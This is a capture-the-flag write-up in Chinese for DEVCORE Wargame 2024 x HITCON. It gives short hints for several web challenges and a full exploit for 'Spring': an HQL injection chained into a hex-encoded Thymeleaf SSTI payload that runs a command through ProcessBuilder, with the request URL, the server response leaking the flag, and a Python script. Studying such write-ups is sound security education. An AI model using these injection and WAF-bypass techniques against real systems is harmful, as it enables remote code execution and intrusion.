# DEVCORE Wargame 2024 x HITCON

## Supercalifragilisticexpialidocious

`create_function` 內部也是 eval，所以可以直接插爛它

參考官方解：https://github.com/DEVCORE-Wargame/HITCON-2024/tree/main/challenges/Supercalifragilisticexpialidocious/solve

## Expressionism

注入點：`<spring:message code="life.quotes.${id}" />` (id 可控)

插個 `${sessionScope.FLAG}` 或是 `${FLAG}` 應該都可以

## Kurapika

單純的上傳漏洞 + WAF

常見的WAF招踹一輪即可發現，multipart 的 boundary 插個 null byte 就能過了

## VArchive

youtube-dl 的 argument injection

payload 忘記留了，跟官方解不太一樣，所以方法不只一種就是了

## Wall..Maria

題目出壞

改 multipart 參數放 GET 就可以繞過檢查了

## Spring

兩個考點:

1. HQL Injection (會用到 Java constant)
2. Thymeleaf SSTI (要簡單小繞一下)

`org.apache.logging.log4j.util.Chars.QUOTE` 等同單引號，可以造成 HQL 和實際跑 MySQL 時不一致

最後透過 UNION 讓回傳值可控，來插入 Thymeleaf SSTI Payload

```
http://web.ctf.d3vc0r3.tw:10101/a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE%20and%20'and%202=3%20union%20select%201,0x5f5f2a7b6e65772e6a6176612e6c616e672e537472696e67286e65772e6a6176612e6c616e672e50726f636573734275696c64657228272f72656164666c6167272c202767697665272c276d65272c27746865272c27666c616727292e737461727428292e676574496e70757453747265616d28292e72656164416c6c42797465732829297d5f5f3a3a2e,%22spring%22--%20'='a
```

->

```
{"timestamp":"2024-08-23T18:31:12.625+00:00","status":500,"error":"Internal Server Error","message":"Error resolving template [DEVCORE{S1mPl3_4nd_r06Us7_JAVA_3c0syS7em}], template might not exist or might not be accessible by any of the configured Template Resolvers","path":"/a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE%20and%20'and%202=3%20union%20select%201,0x5f5f2a7b6e65772e6a6176612e6c616e672e537472696e67286e65772e6a6176612e6c616e672e50726f636573734275696c64657228272f72656164666c6167272c202767697665272c276d65272c27746865272c27666c616727292e737461727428292e676574496e70757453747265616d28292e72656164416c6c42797465732829297d5f5f3a3a2e,%22spring%22--%20'='a"}
```

附一下腳本：

```python
#!/usr/bin/env python3

import requests
from urllib.parse import quote

HOST, PORT = 'web.ctf.d3vc0r3.tw', '10101'

def fuck(s):
    res = "0x"
    for i in s:
        res += "{}".format(hex(ord(i)))[2:]
    return res

_payload = "__*{new.java.lang.String(new.java.lang.ProcessBuilder('/readflag', 'give','me','the','flag').start().getInputStream().readAllBytes())}__::."

pl = f'http://{HOST}:{PORT}/' + "a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE%20and%20'and%202=3%20union%20select%201," +fuck(_payload.replace('\n', '')) + ",%22spring%22--%20'='a"

print(len(pl), pl)

print(requests.get(pl).text)
```
